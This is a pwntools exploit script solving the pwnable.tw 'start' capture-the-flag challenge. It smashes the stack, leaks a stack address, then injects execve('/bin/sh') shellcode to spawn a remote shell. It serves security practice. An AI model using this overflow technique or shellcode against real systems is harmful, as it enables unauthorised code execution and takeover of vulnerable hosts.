from pwn import *

e = ELF("./start")
#p = process("./start")
p = remote("chall.pwnable.tw", 10000)
#gdb.attach(p)
print p.recv()

#payload = "A"*20+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
gadget1 = int(0x08048087)
payload = "A"*20+p32(gadget1)
p.send(payload)

leak = u32(p.recv(4))
p.recv()
print hex(leak)
payload = "A"*20+p32(leak+20)+"\x31\xC0\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xB0\x0B\xCD\x80"
p.sendline(payload)
p.interactive()
